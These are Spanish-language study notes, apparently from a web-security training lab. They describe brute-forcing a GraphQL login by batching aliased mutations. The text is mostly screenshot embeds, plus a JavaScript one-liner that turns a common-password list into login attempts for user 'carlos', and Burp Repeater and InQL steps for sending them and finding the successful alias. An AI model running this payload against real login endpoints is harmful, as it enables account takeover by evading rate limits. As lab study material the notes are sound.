
![[Pasted image 20230818144057.png]]

![[Pasted image 20230818144116.png]]

copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");



Esta será una resolucion entre null11security y emanuel picariello:

![[Pasted image 20230821143136.png]]

![[Pasted image 20230821143157.png]]

![[Pasted image 20230821143327.png]]

copio el URL estando en el repeater y lo pego en el inQL Scanner para encontrar el endpoint que se ejecuta previo a la generacion de este json:

![[Pasted image 20230821143448.png]]

![[Pasted image 20230821143516.png]]

Este resultado lo paso al Repeater desde aca (click derecho)

![[Pasted image 20230821143649.png]]

![[Pasted image 20230821143709.png]]

me aso al lab, en la consola pego el payload que sugieren en la pagina del lab y le doy enter, en esencia ahi podré ver mas claro el par usuario y clave cuando ya haya encontrado el status 200 via brute force:

![[Pasted image 20230821143912.png]]

luego estando en la misma consola presiono Ctrl+V para pegar los resultados y ya tengo las cadenas:

![[Pasted image 20230821144207.png]]

me vuelvo al repeater a analizar el GrapQL:

![[Pasted image 20230821144518.png]]

aca en lugar de token, success pego el anterior clipboard que se me genero en la consola, borro todo y dejo nada mas mutation y sus llaves:

![[Pasted image 20230821145053.png]]

luego tengo que irme a la pestaña pretty o raw y verificar que no tenga ninguna cookie de session, si es asi, la borro, en este caso no me aparecio y le di send, obtuve un 200:

![[Pasted image 20230821145238.png]]

busco el criterio true:

![[Pasted image 20230821145258.png]]

en la consola ubico el bruteforce31:

![[Pasted image 20230821145335.png]]

pruebo credenciales:

![[Pasted image 20230821145415.png]]

